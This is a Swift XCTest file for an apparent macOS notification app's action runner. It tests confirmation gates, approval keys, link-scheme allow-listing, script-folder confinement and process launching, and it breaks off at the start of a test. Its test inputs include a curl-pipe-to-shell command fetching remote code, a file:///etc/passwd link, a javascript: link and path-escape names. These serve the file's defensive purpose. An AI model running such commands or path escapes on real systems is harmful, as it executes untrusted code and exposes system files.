import XCTest
@testable import HeraldCore

/// Records what it was asked to start and what the temporary files held at that moment.
final class FakeLauncher: ActionProcessLauncher, @unchecked Sendable {
    struct Call {
        var request: ActionProcessRequest
        var stdin: String?
        var inputPath: String?
        var input: String?
    }

    private let lock = NSLock()
    private var recorded: [Call] = []
    var result: CommandResult

    init(result: CommandResult = FakeLauncher.ok()) { self.result = result }

    static func ok(output: String = "") -> CommandResult {
        CommandResult(exitCode: 0, signaled: false, timedOut: false, launchError: nil,
                      output: output, truncated: false, duration: 0.01)
    }

    var calls: [Call] { lock.lock(); defer { lock.unlock() }; return recorded }

    private func record(_ call: Call) { lock.lock(); recorded.append(call); lock.unlock() }

    func launch(_ r: ActionProcessRequest) async -> CommandResult {
        var call = Call(request: r)
        if let f = r.stdinFile { call.stdin = try? String(contentsOf: f, encoding: .utf8) }
        if let i = r.arguments.firstIndex(of: "--input-path"), i + 1 < r.arguments.count {
            call.inputPath = r.arguments[i + 1]
            call.input = try? String(contentsOfFile: r.arguments[i + 1], encoding: .utf8)
        }
        record(call)
        return result
    }
}

final class ActionRunnerTests: XCTestCase {
    private var dir: URL!
    private var scripts: URL { dir.appendingPathComponent("scripts", isDirectory: true) }
    private var logURL: URL { dir.appendingPathComponent("logs/actions.log") }
    private var fake: FakeLauncher!

    override func setUp() {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("herald-actions-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: scripts, withIntermediateDirectories: true)
        fake = FakeLauncher()
    }

    override func tearDown() { try? FileManager.default.removeItem(at: dir) }

    /// `-c` (no login profile) keeps the tests independent of the machine's zsh startup files.
    private func runner(launcher: (any ActionProcessLauncher)? = nil, timeout: TimeInterval = 30,
                        shell: String = "/bin/zsh", shortcuts: String = "/usr/bin/shortcuts") -> ActionRunner {
        ActionRunner(scriptsDirectory: scripts, shell: shell, shellArguments: ["-c"], shortcutsPath: shortcuts,
                     timeout: timeout, launcher: launcher ?? fake, log: CommandLog(url: logURL))
    }

    private func invocation(extra: [String: String] = [:], template: String? = "email-accumulated") -> ActionInvocation {
        let n = HeraldNotification(
            app: "webwatcher.email", id: "n1", title: "2 new from Acme", subtitle: "Invoice #4021",
            url: "https://mail.example.com/x",
            buttons: [HeraldButton(label: "Mark as Read", callback: HeraldCallback(payload: .object(["msg": .string("m1")])))],
            metadata: .object(["count": .number(2), "sender": .string("Acme & Co"),
                               "customer": .object(["name": .string("Wile")])]))
        return ActionInvocation(notification: n, fields: TemplateResolver.fields(for: n, extra: extra),
                                extra: extra, template: template, imagePath: "/tmp/cached.png")
    }

    private func plan(_ a: HeraldAction, origin: HeraldActionOrigin = .template, extra: [String: String] = [:],
                      using r: ActionRunner? = nil) -> Result<ActionPlan, ActionError> {
        (r ?? runner()).plan(a, origin: origin, invocation: invocation(extra: extra))
    }

    private func spec(_ result: Result<ActionPlan, ActionError>, file: StaticString = #filePath, line: UInt = #line) -> ActionProcessSpec? {
        guard case .success(.process(let s)) = result else { XCTFail("expected a process plan, got \(result)", file: file, line: line); return nil }
        return s
    }

    private func failure(_ result: Result<ActionPlan, ActionError>, file: StaticString = #filePath, line: UInt = #line) -> String? {
        guard case .failure(let e) = result else { XCTFail("expected a failure, got \(result)", file: file, line: line); return nil }
        return e.reason
    }

    private func json(_ data: Data?) -> [String: Any]? {
        data.flatMap { try? JSONSerialization.jsonObject(with: $0) as? [String: Any] }
    }

    private func write(_ name: String, _ text: String = "#!/bin/sh\necho hi\n", mode: Int = 0o644) {
        let u = scripts.appendingPathComponent(name)
        try? FileManager.default.createDirectory(at: u.deletingLastPathComponent(), withIntermediateDirectories: true)
        try? text.write(to: u, atomically: true, encoding: .utf8)
        try? FileManager.default.setAttributes([.posixPermissions: mode], ofItemAtPath: u.path)
    }

    // MARK: Gate

    func testGateMatrix() {
        func gate(_ kind: HeraldActionKind, _ origin: HeraldActionOrigin, command: String? = "echo hi") -> ActionGate {
            ActionRunner.gate(for: HeraldAction(id: "a", label: "A", kind: kind, command: command), origin: origin)
        }
        XCTAssertEqual(gate(.command, .issuer), .appPermission)
        XCTAssertEqual(gate(.script, .issuer), .appPermission)
        XCTAssertEqual(gate(.shortcut, .issuer), .appPermission)
        XCTAssertEqual(gate(.command, .template), .templateConfirmation(kind: .command, subject: "echo hi"))
        for kind in [HeraldActionKind.url, .callback, .dismiss, .snooze] {
            XCTAssertEqual(gate(kind, .issuer), .open)
            XCTAssertEqual(gate(kind, .template), .open)
        }
        // A template's own script or shortcut is code the template author wrote (`shortcuts run` is headless),
        // so it is confirmed like a command.
        func codeGate(_ a: HeraldAction) -> ActionGate { ActionRunner.gate(for: a, origin: .template) }
        XCTAssertEqual(codeGate(HeraldAction(id: "s", label: "S", kind: .script, script: "sync.sh")),
                       .templateConfirmation(kind: .script, subject: "sync.sh"))
        XCTAssertEqual(codeGate(HeraldAction(id: "s", label: "S", kind: .shortcut, shortcut: "Follow up")),
                       .templateConfirmation(kind: .shortcut, subject: "Follow up"))
    }

    func testApprovalKeysAreBoundToWhatRuns() {
        let r = runner()
        write("sync.sh", "echo one\n")
        let script = HeraldAction(id: "s", label: "S", kind: .script, script: "sync.sh")
        let k1 = r.approvalKey(for: script)
        XCTAssertNotNil(k1)
        XCTAssertTrue(k1!.hasPrefix("script: sync.sh sha256:"))
        XCTAssertEqual(r.approvalKey(for: script), k1, "stable while the file is unchanged")
        write("sync.sh", "echo two\n")
        XCTAssertNotEqual(r.approvalKey(for: script), k1, "an edited script asks again")
        XCTAssertTrue(r.approvalKey(for: HeraldAction(id: "m", label: "M", kind: .script, script: "nope.sh"))!.hasSuffix("sha256:missing"))

        let sc = HeraldAction(id: "f", label: "F", kind: .shortcut, shortcut: "Follow up", input: "{title}")
        var other = sc; other.input = "{body}"
        XCTAssertNotEqual(r.approvalKey(for: sc), r.approvalKey(for: other), "a changed input asks again")
        other = sc; other.shortcut = "Delete everything"
        XCTAssertNotEqual(r.approvalKey(for: sc), r.approvalKey(for: other), "a different shortcut asks again")
        XCTAssertEqual(r.approvalKey(for: HeraldAction(id: "c", label: "C", kind: .command, command: "  ls  ")), "ls")
        XCTAssertNil(r.approvalKey(for: HeraldAction(id: "u", label: "U", kind: .url, url: "https://x.example")))

        // The approval store treats the keys like commands.
        let approvals = TemplateCommandApprovals(file: dir.appendingPathComponent("a.json"))
        approvals.approve(app: "x", template: "t", commands: [k1!])
        XCTAssertTrue(approvals.isApproved(app: "x", template: "t", command: k1!))
        XCTAssertFalse(approvals.isApproved(app: "x", template: "t", command: r.approvalKey(for: script)!))
    }

    func testTemplateKeysCoverCommandsScriptsAndShortcuts() {
        let r = runner()
        var t = template()
        t.actionRules.append(HeraldActionRule(add: HeraldAction(id: "run", label: "Run", kind: .script, script: "sync.sh")))
        let keys = r.templateApprovalKeys(of: t)
        XCTAssertTrue(keys.contains("followup.sh"))
        XCTAssertTrue(keys.contains { $0.hasPrefix("shortcut: S ") })
        XCTAssertTrue(keys.contains { $0.hasPrefix("script: sync.sh ") })
    }

    func testTemplateDefaultButtonsAreTheTemplatesOwnNotTheIssuers() {
        // TemplateResolver copies the template's v1 `buttons` into a notification that sent none.
        var t = HeraldTemplate(name: "n", app: "a")
        t.buttons = [HeraldButton(label: "Open log", command: "curl https://x.example/i.sh | sh")]
        let resolved = TemplateResolver.resolve(HeraldNotification(app: "a", id: "n1", title: "T"), with: t)
        let list = ActionRunner.resolvedActions(notification: resolved, manifest: nil, template: t)
        XCTAssertEqual(list.map(\.origin), [.template])
        XCTAssertEqual(ActionRunner.gate(for: list[0].action, origin: list[0].origin),
                       .templateConfirmation(kind: .command, subject: "curl https://x.example/i.sh | sh"))
        // Buttons the issuer sent itself stay the issuer's, even when the template also has defaults.
        let own = HeraldNotification(app: "a", id: "n2", title: "T", buttons: [HeraldButton(label: "Run", command: "x.sh")])
        XCTAssertEqual(ActionRunner.resolvedActions(notification: own, manifest: nil, template: t).map(\.origin), [.issuer])
        XCTAssertEqual(ActionRunner.templateCommands(of: t), ["curl https://x.example/i.sh | sh"])
    }

    func testReplacingAnIssuerButtonIsNamed() {
        let n = emailNotification(), m = emailManifest()
        let replacing = HeraldAction(id: "markRead", label: "Mark as Read", kind: .script, script: "sync.sh")
        XCTAssertEqual(ActionRunner.replacedIssuerLabel(for: replacing, notification: n, manifest: m, template: template()), "Mark as Read")
        let fresh = HeraldAction(id: "follow", label: "Follow up", kind: .script, script: "sync.sh")
        XCTAssertNil(ActionRunner.replacedIssuerLabel(for: fresh, notification: n, manifest: m, template: template()))
    }

    // MARK: URL

    func testIssuerLinkIsUsedAsWritten() {
        let a = HeraldAction(id: "o", label: "Open", kind: .url, url: "https://x.example.com/{id}")
        guard case .success(.openURL(let url)) = plan(a, origin: .issuer) else { return XCTFail() }
        XCTAssertFalse(url.absoluteString.contains("n1"), "an issuer's braces are not placeholders")
    }

    func testTemplateLinkFillsAndEscapesTokens() {
        let a = HeraldAction(id: "o", label: "Search", kind: .url, url: "https://example.com/s?q={sender}&n={count}&z={missing}")
        guard case .success(.openURL(let url)) = plan(a) else { return XCTFail() }
        XCTAssertEqual(url.absoluteString, "https://example.com/s?q=Acme%20%26%20Co&n=2&z=")
    }

    func testTemplateLinkKeepsAWholeLinkToken() {
        guard case .success(.openURL(let url)) = plan(HeraldAction(id: "o", label: "Open", kind: .url, url: "{url}")) else { return XCTFail() }
        XCTAssertEqual(url.absoluteString, "https://mail.example.com/x")
    }

    func testOnlyWebAndMailLinksOpen() {
        for u in ["file:///etc/passwd", "shortcuts://run-shortcut?name=x", "javascript:alert(1)", "https://"] {
            for origin in [HeraldActionOrigin.issuer, .template] {
                XCTAssertEqual(failure(plan(HeraldAction(id: "o", label: "O", kind: .url, url: u), origin: origin)),
                               "this link type is not allowed", u)
            }
        }
        // A token cannot smuggle in another scheme: its value is escaped, so it no longer parses as one.
        var n = invocation()
        n.fields["url"] = .text("file:///etc/passwd")
        let r = runner().plan(HeraldAction(id: "o", label: "O", kind: .url, url: "{url}"), origin: .template, invocation: n)
        XCTAssertNotNil(failure(r))
    }

    func testMissingLink() {
        XCTAssertEqual(failure(plan(HeraldAction(id: "o", label: "O", kind: .url))), "no link")
    }

    // MARK: Command

    func testCommandRunsThroughTheShellAndIsNeverInterpolated() {
        let a = HeraldAction(id: "c", label: "Archive", kind: .command, command: "echo {title}; ./archive.sh")
        guard let s = spec(plan(a, origin: .issuer)) else { return }
        XCTAssertEqual(s.kind, .command)
        XCTAssertEqual(s.executable, "/bin/zsh")
        XCTAssertEqual(s.arguments, ["-c", "echo {title}; ./archive.sh"])
        XCTAssertEqual(s.timeout, 30)
    }

    func testCommandGetsTheMergedPayloadOnStdinAndInTheEnvironment() {
        let a = HeraldAction(id: "c", label: "Archive it", kind: .command, command: "cat")
        guard let s = spec(plan(a, extra: ["queue": "inbox"])) else { return }
        let obj = json(s.stdin)
        XCTAssertEqual(obj?["app"] as? String, "webwatcher.email")
        XCTAssertEqual(obj?["id"] as? String, "n1")
        XCTAssertEqual(obj?["template"] as? String, "email-accumulated")
        XCTAssertEqual(obj?["imagePath"] as? String, "/tmp/cached.png")
        XCTAssertEqual((obj?["extra"] as? [String: String]), ["queue": "inbox"])
        let fields = obj?["fields"] as? [String: Any]
        XCTAssertEqual(fields?["title"] as? String, "2 new from Acme")
        XCTAssertEqual(fields?["customer.name"] as? String, "Wile")
        XCTAssertEqual(fields?["count"] as? Double, 2)
        XCTAssertEqual((obj?["action"] as? [String: String])?["kind"], "command")
        XCTAssertNotNil((obj?["notification"] as? [String: Any])?["metadata"])

        XCTAssertEqual(s.environment["HERALD_APP"], "webwatcher.email")
        XCTAssertEqual(s.environment["HERALD_NOTIFICATION_ID"], "n1")
        XCTAssertEqual(s.environment["HERALD_ACTION"], "Archive it")
        XCTAssertEqual(s.environment["HERALD_ACTION_ID"], "c")
        XCTAssertEqual(s.environment["HERALD_ORIGIN"], "template")
        XCTAssertEqual(s.environment["HERALD_TEMPLATE"], "email-accumulated")
        XCTAssertEqual(s.environment["HERALD_FIELD_TITLE"], "2 new from Acme")
        XCTAssertEqual(s.environment["HERALD_FIELD_CUSTOMER_NAME"], "Wile")
        XCTAssertEqual(s.environment["HERALD_FIELD_COUNT"], "2")
        XCTAssertEqual(s.environment["HERALD_EXTRA_QUEUE"], "inbox")
    }

    func testEnvironmentIsBounded() {
        var inv = invocation()
        inv.fields["big"] = .text(String(repeating: "x", count: 10_000))
        inv.fields["nul"] = .text("a\0b")
        let env = ActionRunner.environment(HeraldAction(id: "a", label: "A", kind: .command), origin: .issuer, inv)
        XCTAssertEqual(env["HERALD_FIELD_BIG"]?.utf8.count, 4096)
        XCTAssertEqual(env["HERALD_FIELD_NUL"], "ab")
    }

    func testEmptyCommand() {
        XCTAssertEqual(failure(plan(HeraldAction(id: "c", label: "C", kind: .command, command: "  "))), "no command")
        XCTAssertEqual(failure(plan(HeraldAction(id: "c", label: "C", kind: .command))), "no command")
    }

    // MARK: Script

    func testScriptByInterpreterOrExecutableBit() {
        write("notify.sh")
        write("tool.py", mode: 0o755)
        write("old.scpt", mode: 0o755)
        write("plain.txt")
        write("sub/deep.bash")

        func run(_ name: String) -> (String, [String])? {
            spec(plan(HeraldAction(id: "s", label: "S", kind: .script, script: name))).map { ($0.executable, $0.arguments) }
        }
        let sh = run("notify.sh")
        XCTAssertEqual(sh?.0, "/bin/zsh")
        XCTAssertEqual(sh?.1, [scripts.appendingPathComponent("notify.sh").path])
        let py = run("tool.py")
        XCTAssertEqual(py?.0, scripts.appendingPathComponent("tool.py").path, "an executable file is run directly")
        XCTAssertEqual(py?.1, [])
        XCTAssertEqual(run("old.scpt")?.0, "/usr/bin/osascript", "compiled AppleScript always goes through osascript")
        XCTAssertEqual(run("sub/deep.bash")?.0, "/bin/bash")
        XCTAssertTrue(failure(plan(HeraldAction(id: "s", label: "S", kind: .script, script: "plain.txt")))?.contains("not executable") == true)
    }

    func testScriptGetsPayloadOnStdinAndRunsInItsFolder() {
        write("notify.sh")
        guard let s = spec(plan(HeraldAction(id: "s", label: "S", kind: .script, script: "notify.sh"), extra: ["a": "b"])) else { return }
        XCTAssertEqual((json(s.stdin)?["extra"] as? [String: String]), ["a": "b"])
        XCTAssertEqual(s.workingDirectory, scripts)
        XCTAssertEqual(s.kind, .script)
    }

    func testScriptNamesCannotEscapeTheFolder() {
        write("ok.sh")
        for name in ["../x.sh", "sub/../../x.sh", "/bin/ls", "~/x.sh", "a\nb.sh", "", "  "] {
            XCTAssertNotNil(failure(plan(HeraldAction(id: "s", label: "S", kind: .script, script: name))), name)
        }
        XCTAssertEqual(failure(plan(HeraldAction(id: "s", label: "S", kind: .script, script: "missing.sh"))), "script not found: missing.sh")
        try? FileManager.default.createDirectory(at: scripts.appendingPathComponent("folder.sh"), withIntermediateDirectories: true)
        XCTAssertEqual(failure(plan(HeraldAction(id: "s", label: "S", kind: .script, script: "folder.sh"))), "script not found: folder.sh")
        XCTAssertEqual(failure(plan(HeraldAction(id: "s", label: "S", kind: .script))), "no script name")
    }

    func testListScripts() {
        write("b.sh"); write("a.py", mode: 0o755); write("c.txt"); write("sub/d.sh"); write(".hidden.sh")
        let list = runner().listScripts()
        XCTAssertEqual(list.map(\.name), ["a.py", "b.sh", "c.txt", "sub/d.sh"])
        XCTAssertEqual(list.map(\.isExecutable), [true, false, false, false])
        XCTAssertEqual(list.map(\.runnable), [true, true, false, true])
    }

    // MARK: Shortcut

    func testShortcutWithoutInputGetsTheJSON() {
        guard let s = spec(plan(HeraldAction(id: "f", label: "Follow up", kind: .shortcut, shortcut: "Create follow-up"), extra: ["list": "Work"])) else { return }
        XCTAssertEqual(s.executable, "/usr/bin/shortcuts")
        XCTAssertEqual(s.arguments, ["run", "Create follow-up", "--input-path", ActionProcessSpec.inputPathToken])
        XCTAssertEqual(s.inputFileExtension, "json")
        XCTAssertEqual((json(s.inputFile)?["extra"] as? [String: String]), ["list": "Work"])
        XCTAssertNil(s.stdin)
    }

    func testShortcutWithInputGetsTheBoundText() {
        let a = HeraldAction(id: "f", label: "Follow up", kind: .shortcut, shortcut: "Create follow-up", input: "{title}\n{url}\n{missing}|{extra.list}")
        guard let s = spec(plan(a, extra: ["list": "Work"])) else { return }
        XCTAssertEqual(s.inputFileExtension, "txt")
        XCTAssertEqual(s.inputFile.map { String(decoding: $0, as: UTF8.self) },
                       "2 new from Acme\nhttps://mail.example.com/x\n|Work")
    }

    func testShortcutNames() {
        for bad in ["", "  ", "-h", "--help", "a\u{7}b", String(repeating: "x", count: 600)] {
            XCTAssertNotNil(failure(plan(HeraldAction(id: "f", label: "F", kind: .shortcut, shortcut: bad))), bad)
        }
        XCTAssertEqual(failure(plan(HeraldAction(id: "f", label: "F", kind: .shortcut))), "no shortcut name")
        XCTAssertNotNil(spec(plan(HeraldAction(id: "f", label: "F", kind: .shortcut, shortcut: "Mail \u{2192} Notes"))))
    }

    // MARK: Callback, dismiss, snooze

    func testCallbackKeepsTheIssuersPayloadAndAddsExtra() {
        func payload(_ cb: HeraldCallback?, extra: [String: String]) -> HeraldCallback? {
            guard case .success(.callback(let out)) = plan(HeraldAction(id: "c", label: "C", kind: .callback, callback: cb), extra: extra) else { return nil }
            return out
        }
        let issuer = HeraldCallback(payload: .object(["msg": .string("m1")]))
        XCTAssertEqual(payload(issuer, extra: [:]), issuer, "no extra: untouched")
        XCTAssertEqual(payload(issuer, extra: ["q": "inbox"])?.payload,
                       .object(["msg": .string("m1"), "extra": .object(["q": .string("inbox")])]))
        XCTAssertEqual(payload(nil, extra: ["q": "inbox"])?.payload, .object(["extra": .object(["q": .string("inbox")])]))
        let own = HeraldCallback(payload: .object(["extra": .string("mine")]))
        XCTAssertEqual(payload(own, extra: ["q": "inbox"]), own, "the issuer's own `extra` key wins")
        let list = HeraldCallback(payload: .array([.number(1)]))
        XCTAssertEqual(payload(list, extra: ["q": "inbox"]), list)
        XCTAssertEqual(payload(HeraldCallback(url: "http://127.0.0.1:1/x"), extra: [:])?.url, "http://127.0.0.1:1/x")
    }

    func testDismissAndSnooze() {
        XCTAssertEqual(plan(HeraldAction(id: "d", label: "D", kind: .dismiss)), .success(.dismiss))
        XCTAssertEqual(plan(HeraldAction(id: "s", label: "S", kind: .snooze)), .success(.snooze(minutes: 15)))
        XCTAssertEqual(plan(HeraldAction(id: "s", label: "S", kind: .snooze, snoozeMinutes: 90)), .success(.snooze(minutes: 90)))
        XCTAssertEqual(failure(plan(HeraldAction(id: "s", label: "S", kind: .snooze, snoozeMinutes: 0))), "invalid snooze time")
        XCTAssertEqual(failure(plan(HeraldAction(id: "s", label: "S", kind: .snooze, snoozeMinutes: 999_999))), "invalid snooze time")
    }

    // MARK: Resolving what a banner offers

    func testLegacyButtonKeepsV1Precedence() {
        let b = HeraldButton(label: "Mark Done", url: "https://x.example.com", command: "echo", callback: HeraldCallback())
        XCTAssertEqual(ActionRunner.legacyAction(b).kind, .url)
        XCTAssertEqual(ActionRunner.legacyAction(HeraldButton(label: "A", command: "echo", callback: HeraldCallback())).kind, .command)
        XCTAssertEqual(ActionRunner.legacyAction(HeraldButton(label: "A", callback: HeraldCallback())).kind, .callback)
        XCTAssertEqual(ActionRunner.legacyAction(HeraldButton(label: "A")).kind, .dismiss)
        XCTAssertEqual(ActionRunner.legacyAction(b).id, "mark-done")
    }

    private func template() -> HeraldTemplate {
        let inline = HeraldAction(id: "tidy", label: "Tidy", kind: .command, command: "tidy.sh")
        return HeraldTemplate(
            name: "email-accumulated", app: "webwatcher.email", grid: .standard,
            cells: [HeraldCell(id: "c1", row: 2, col: 0, component: .button(HeraldButtonComponent(action: inline)))],
            actionRules: [
                HeraldActionRule(match: "archive", relabel: "Archive it", style: "destructive", position: 0),
                HeraldActionRule(add: HeraldAction(id: "follow", label: "Follow up", kind: .command, command: "followup.sh")),
                HeraldActionRule(add: HeraldAction(id: "again", label: "Again", kind: .command, command: "followup.sh")),
                HeraldActionRule(add: HeraldAction(id: "sc", label: "Shortcut", kind: .shortcut, shortcut: "S")),
            ],
            extra: ["queue": "inbox"])
    }

    private func emailNotification() -> HeraldNotification {
        HeraldNotification(app: "webwatcher.email", id: "n1", title: "t", buttons: [
            HeraldButton(label: "Mark as Read", callback: HeraldCallback()),
            HeraldButton(label: "Archive", style: "destructive", callback: HeraldCallback())])
    }

    private func emailManifest() -> HeraldManifest {
        HeraldManifest(app: "webwatcher.email", actions: [
            HeraldButton(label: "Mark as Read", callback: HeraldCallback()),
            HeraldButton(label: "Archive", callback: HeraldCallback())], actionIDs: ["markRead", "archive"])
    }

    func testResolvedActionsCarryOrigins() {
        let list = ActionRunner.resolvedActions(notification: emailNotification(), manifest: emailManifest(), template: template())
        XCTAssertEqual(list.map(\.action.id), ["archive", "markRead", "follow", "again", "sc", "tidy"])
        XCTAssertEqual(list.map(\.origin), [.issuer, .issuer, .template, .template, .template, .template])
        XCTAssertEqual(list.first?.action.label, "Archive it")
        // Without a template the issuer's buttons are all there is.
        let plain = ActionRunner.resolvedActions(notification: emailNotification(), manifest: nil, template: nil)
        XCTAssertEqual(plain.map(\.origin), [.issuer, .issuer])
        XCTAssertEqual(plain.map(\.action.id), ["mark-as-read", "archive"])
    }

    func testMatchPrefersTheIdenticalActionThenIdAndKind() {
        let list = ActionRunner.resolvedActions(notification: emailNotification(), manifest: emailManifest(), template: template())
        let tidy = list.last!.action
        XCTAssertEqual(ActionRunner.match(tidy, in: list)?.origin, .template)
        var relabelled = tidy; relabelled.label = "Tidy 3"
        XCTAssertEqual(ActionRunner.match(relabelled, in: list)?.action, tidy, "a view may have filled a token in the label")
        XCTAssertNil(ActionRunner.match(HeraldAction(id: "other", label: "X", kind: .command, command: "x"), in: list))
        var wrongKind = tidy; wrongKind.kind = .url
        XCTAssertNil(ActionRunner.match(wrongKind, in: list))
    }

    func testIssuerLabelSurvivesARelabel() {
        XCTAssertEqual(ActionRunner.issuerLabel(id: "archive", notification: emailNotification(), manifest: emailManifest()), "Archive")
        XCTAssertEqual(ActionRunner.issuerLabel(id: "markRead", notification: emailNotification(), manifest: emailManifest()), "Mark as Read")
        XCTAssertNil(ActionRunner.issuerLabel(id: "follow", notification: emailNotification(), manifest: emailManifest()))
    }

    func testTemplateCommandsAreTheTemplatesOwnOnly() {
        // rule adds, inline actions and the v1 default buttons, trimmed and de-duplicated; a shortcut is not a command.
        var t = template()
        t.buttons = [HeraldButton(label: "Old", command: "legacy.sh")]
        XCTAssertEqual(ActionRunner.templateCommands(of: t), ["followup.sh", "tidy.sh", "legacy.sh"],
                       "a template's default buttons are its own code and covered by its confirmation")
        XCTAssertEqual(ActionRunner.templateCommands(of: HeraldTemplate(name: "n", app: "a")), [])
    }

    // MARK: Running (fake launcher)

    private let context = CommandContext(app: "webwatcher.email", notificationId: "n1", action: "Follow up")

    func testShortcutRunWritesTheInputFileAndCleansUp() async {
        let a = HeraldAction(id: "f", label: "Follow up", kind: .shortcut, shortcut: "Create follow-up", input: "{title}")
        guard let s = spec(plan(a)) else { return }
        let result = await runner().run(s, context: context, origin: .template)
        XCTAssertTrue(result.succeeded)
        let call = fake.calls.first
        XCTAssertEqual(call?.request.executable, "/usr/bin/shortcuts")
        XCTAssertEqual(call?.request.arguments.prefix(2).map { $0 }, ["run", "Create follow-up"])
        XCTAssertEqual(call?.input, "2 new from Acme")
        XCTAssertTrue(call?.inputPath?.hasSuffix(".txt") == true)
        XCTAssertNil(call?.request.stdinFile)
        XCTAssertFalse(FileManager.default.fileExists(atPath: call?.inputPath ?? "/nonexistent"), "the temp file is removed")
        XCTAssertEqual(call?.request.timeout, 30)
    }

    func testScriptRunPassesStdinThroughAFileAndCleansUp() async {
        write("n.sh")
        guard let s = spec(plan(HeraldAction(id: "s", label: "S", kind: .script, script: "n.sh"), extra: ["k": "v"])) else { return }
        _ = await runner().run(s, context: context, origin: .template)
        let call = fake.calls.first
        XCTAssertEqual(json(call?.stdin.map { Data($0.utf8) })?["app"] as? String, "webwatcher.email")
        XCTAssertEqual(call?.request.environment["HERALD_EXTRA_K"], "v")
        XCTAssertEqual(call?.request.workingDirectory, scripts)
        XCTAssertFalse(FileManager.default.fileExists(atPath: call?.request.stdinFile?.path ?? "/nonexistent"))
    }

    func testTheRunIsLogged() async {
        fake.result = FakeLauncher.ok(output: "Created reminder\n")
        guard let s = spec(plan(HeraldAction(id: "f", label: "Follow up", kind: .shortcut, shortcut: "Create follow-up"))) else { return }
        _ = await runner().run(s, context: CommandContext(app: "a", notificationId: "n\n1", action: "Fol\"low"), origin: .template)
        let log = (try? String(contentsOf: logURL, encoding: .utf8)) ?? ""
        XCTAssertTrue(log.contains("app=a id=n 1 action=\"Fol'low\" kind=shortcut origin=template result=\"exit 0\""), log)
        XCTAssertTrue(log.contains("$ shortcuts run \"Create follow-up\" --input-path <input.json>"), log)
        XCTAssertTrue(log.contains("Created reminder"), log)
        XCTAssertEqual(ActionLog.defaultURL.lastPathComponent, "actions.log")
        XCTAssertTrue(ActionLog.defaultURL.path.contains("Library/Logs/Herald"))
    }

    func testFailureReasons() {
        let r = runner()
        func result(code: Int32 = 1, signaled: Bool = false, timedOut: Bool = false, launchError: String? = nil, output: String = "") -> CommandResult {
            CommandResult(exitCode: code, signaled: signaled, timedOut: timedOut, launchError: launchError, output: output, truncated: false, duration: 0)
        }
        XCTAssertEqual(r.failureReason(result(launchError: "no such file")), "could not start: no such file")
        XCTAssertEqual(r.failureReason(result(timedOut: true)), "timed out after 30 s")
        XCTAssertEqual(r.failureReason(result(code: 9, signaled: true)), "killed by signal 9")
        XCTAssertEqual(r.failureReason(result(code: 2)), "exit 2")
        XCTAssertEqual(r.failureReason(result(output: "\n  Error: Couldn\u{2019}t find shortcut\nmore")), "exit 1: Error: Couldn\u{2019}t find shortcut")
    }

    // MARK: Running (real processes)

    func testRealCommandReceivesTheJSONOnStdinAndTheEnvironment() async {
        let real = runner(launcher: SystemProcessLauncher())
        guard let s = spec(plan(HeraldAction(id: "c", label: "Go", kind: .command, command: "cat; printf '|%s|%s' \"$HERALD_ACTION\" \"$HERALD_FIELD_TITLE\""),
                                extra: ["q": "x"], using: real)) else { return }
        let result = await real.run(s, context: context, origin: .template)
        XCTAssertTrue(result.succeeded, result.summary)
        let split = result.output.components(separatedBy: "|")
        XCTAssertEqual(json(split.first.map { Data($0.utf8) })?["app"] as? String, "webwatcher.email")
        XCTAssertEqual(Array(split.dropFirst()), ["Go", "2 new from Acme"])
        let log = (try? String(contentsOf: logURL, encoding: .utf8)) ?? ""
        XCTAssertTrue(log.contains("kind=command"), log)
    }

    func testRealScriptRuns() async {
        write("hello.sh", "#!/bin/sh\nread line\necho \"got: $HERALD_APP\"\n", mode: 0o755)
        let real = runner(launcher: SystemProcessLauncher())
        guard let s = spec(plan(HeraldAction(id: "s", label: "S", kind: .script, script: "hello.sh"), using: real)) else { return }
        let result = await real.run(s, context: context)
        XCTAssertTrue(result.succeeded, result.summary + result.output)
        XCTAssertEqual(result.output, "got: webwatcher.email\n")
    }

    func testRealFailureAndTimeout() async {
        let real = runner(launcher: SystemProcessLauncher(), timeout: 1)
        guard let fail = spec(plan(HeraldAction(id: "c", label: "C", kind: .command, command: "echo oops 1>&2; exit 3"), using: real)),
              let slow = spec(plan(HeraldAction(id: "c", label: "C", kind: .command, command: "sleep 30"), using: real)) else { return }
        let failed = await real.run(fail, context: context)
        XCTAssertFalse(failed.succeeded)
        XCTAssertEqual(real.failureReason(failed), "exit 3: oops")
        let started = Date()
        let timedOut = await real.run(slow, context: context)
        XCTAssertTrue(timedOut.timedOut)
        XCTAssertLessThan(Date().timeIntervalSince(started), 10)
        XCTAssertEqual(real.failureReason(timedOut), "timed out after 1 s")
    }

    /// Issue #38: the Shortcuts success path through a real process. A stub `shortcuts` that behaves like the
    /// real tool for `run <name> --input-path <file>` (reads the input file, prints, exits 0) stands in for it, so
    /// the argv, the temporary input file, the success verdict and the action log are all exercised without
    /// running anything on the user's Shortcuts.
    func testRealShortcutSuccessPathWithAStandInShortcutsTool() async {
        write("fake-shortcuts", """
            #!/bin/sh
            [ "$1" = run ] || { echo "bad verb $1" >&2; exit 64; }
            name="$2"; [ "$3" = --input-path ] || { echo "no input path" >&2; exit 65; }
            printf 'ran %s with %s' "$name" "$(cat "$4")"
            """, mode: 0o755)
        let stub = scripts.appendingPathComponent("fake-shortcuts").path
        let real = runner(launcher: SystemProcessLauncher(), shortcuts: stub)
        let a = HeraldAction(id: "f", label: "Follow up", kind: .shortcut, shortcut: "Create follow-up", input: "{title}")
        guard let s = spec(plan(a, using: real)) else { return }
        let result = await real.run(s, context: context, origin: .template)
        XCTAssertTrue(result.succeeded, result.summary + result.output)
        XCTAssertEqual(result.output, "ran Create follow-up with 2 new from Acme")
        let log = (try? String(contentsOf: logURL, encoding: .utf8)) ?? ""
        XCTAssertTrue(log.contains("kind=shortcut"), log)
        // The same stub failing: a non-zero exit is reported with its reason, not as success.
        write("fake-shortcuts", "#!/bin/sh\necho 'Error: Couldn\u{2019}t find shortcut' >&2\nexit 1\n", mode: 0o755)
        let failed = await real.run(s, context: context, origin: .template)
        XCTAssertFalse(failed.succeeded)
        XCTAssertTrue(real.failureReason(failed).contains("find shortcut"), real.failureReason(failed))
    }

    func testRealMissingProgramIsALaunchError() async {
        let real = runner(launcher: SystemProcessLauncher(), shortcuts: "/nonexistent/shortcuts")
        guard let s = spec(plan(HeraldAction(id: "f", label: "F", kind: .shortcut, shortcut: "X"), using: real)) else { return }
        let result = await real.run(s, context: context)
        XCTAssertNotNil(result.launchError)
        XCTAssertTrue(real.failureReason(result).hasPrefix("could not start"))
    }

    // MARK: Per-template confirmation

    func testApprovalsAreBoundToTheCommandText() {
